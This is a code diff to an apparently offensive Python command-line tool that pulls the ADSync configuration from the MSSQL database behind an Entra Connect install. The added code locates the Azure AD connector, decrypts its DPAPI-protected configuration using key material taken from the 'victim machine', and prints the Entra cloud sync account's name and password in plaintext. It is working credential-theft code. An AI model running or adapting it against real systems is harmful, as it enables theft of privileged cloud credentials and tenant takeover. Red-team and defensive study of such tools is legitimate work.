@@ -39,6 +39,58 @@ def _parse_private_config(private_config_xml):
     )
 
 
+def _all_xml_parameters(xml):
+    if isinstance(xml, bytes):
+        xml = xml.decode("utf-16-le", errors="ignore")
+    return dict(re.findall(
+        r'<parameter[^>]*\bname="([^"]+)"[^>]*>(.*?)</parameter>', xml, re.DOTALL))
+
+
+def _find_sync_username(private_config_xml):
+    """Locate the Entra cloud sync account UPN (Sync_<host>_<id>@<tenant>) in the
+    Azure AD connector's plaintext config, independent of the parameter name."""
+    if isinstance(private_config_xml, bytes):
+        private_config_xml = private_config_xml.decode("utf-16-le", errors="ignore")
+    if not private_config_xml:
+        return None
+    m = re.search(r'Sync_[^@<>"\s]+@[^<>"\s]+', private_config_xml)
+    return m.group(0) if m else None
+
+
+def _extract_aad_password(decrypted):
+    """Pull the sync account password out of the decrypted Azure AD connector
+    config. The parameter is normally 'Password'; fall back to any password-like
+    parameter so a schema change across builds does not silently drop it."""
+    try:
+        return _extract_xml_parameter(decrypted, "Password")
+    except ValueError:
+        pass
+    for name, value in _all_xml_parameters(decrypted).items():
+        if "password" in name.lower():
+            return value
+    raise ValueError("Password not found in the decrypted Azure AD connector configuration")
+
+
+def _fetch_aad_agent(mssql):
+    """Return the Azure AD connector row from mms_management_agent. The AAD
+    connector is an Extensible2 management agent; fall back to matching the
+    tenant marker in case a build labels ma_type differently."""
+    rows = mssql.batch(
+        "SELECT private_configuration_xml, encrypted_configuration "
+        "FROM mms_management_agent WHERE ma_type = 'Extensible2'")
+    if rows:
+        return rows[0]
+    rows = mssql.batch(
+        "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent")
+    for row in rows or []:
+        priv = row.get("private_configuration_xml")
+        if isinstance(priv, bytes):
+            priv = priv.decode("utf-16-le", errors="ignore")
+        if priv and "onmicrosoft.com" in priv.lower():
+            return row
+    return None
+
+
 def _parse_masterkey_file(masterkey_path):
     """Split a raw DPAPI masterkey file into its MasterKey and (optional)
     DomainKey sub-structures, mirroring impacket's examples/dpapi.py."""
@@ -110,13 +162,14 @@ def azsync_extract(
         username: str = typer.Option(..., "-username", help="Username of the associated user"),
         password: str = typer.Option(..., "-password", help="Password of the associated user"),
         domain: str = typer.Option(None, "-domain", help="Domain name"),
-        masterkey: str = typer.Option(None, "-masterkey", help="Path to the DPAPI master key file (must be acquired extracted from the vicitm machine)"),
-        backup_key:  str = typer.Option(None, "-backupkey", help="Path to the DPAPI backupkey (must be acquired extracted from the vicitm machine)"),
-        nthash:  str = typer.Option(None, "-nthash", help="NT hash of the masterkey owner, used with -sid (must be acquired extracted from the vicitm machine)"),
+        masterkey: str = typer.Option(None, "-masterkey", help="Path to the DPAPI master key file (must be acquired extracted from the victim machine)"),
+        backup_key:  str = typer.Option(None, "-backupkey", help="Path to the DPAPI backupkey (must be acquired extracted from the victim machine)"),
+        nthash:  str = typer.Option(None, "-nthash", help="NT hash of the masterkey owner, used with -sid (must be acquired extracted from the victim machine)"),
         sid: str = typer.Option(None, "-sid", help="SID of the masterkey owner, required alongside -nthash"),
         output: OutputFormat = output_option(),
 ):
-    """Pull the ADSync configuration off a MSSQL instance backing an Entra Connect / ADSync install."""
+    """Pull the ADSync configuration off a MSSQL instance backing an Entra Connect / ADSync install.
+    """
     if windows_auth and not domain:
         domain = '.'
     mssql = MSSQL(target, port)
@@ -156,5 +209,19 @@ def azsync_extract(
         except ValueError:
             password = decrypted.decode("utf-16-le", errors="ignore").rstrip("\x00")
         console.print(f"[bold green][+][/] Recovered password for {victim_domain}\\{victim_user}: {password}")
+
+    aad = _fetch_aad_agent(mssql)
+    if not aad:
+        console.print("[bold yellow][!][/] No Azure AD connector found; skipping Entra sync account")
+    else:
+        sync_user = _find_sync_username(aad.get("private_configuration_xml"))
+        console.print(f"[bold green][+][/] Entra sync account: {sync_user or '(UPN not found in plaintext config)'}")
+        if masterkey and (backup_key or nthash):
+            sync_password = _extract_aad_password(
+                _decrypt_blob(masterkey, aad.get("encrypted_configuration"), entropy,
+                              backup_key=backup_key, nthash=nthash, sid=sid))
+            console.print(f"[bold green][+][/] Recovered password for {sync_user or 'Entra sync account'}: {sync_password}")
+        else:
+            console.print("[bold yellow][!][/] Provide -masterkey with -backupkey or -nthash/-sid to recover the sync account password")
 
 
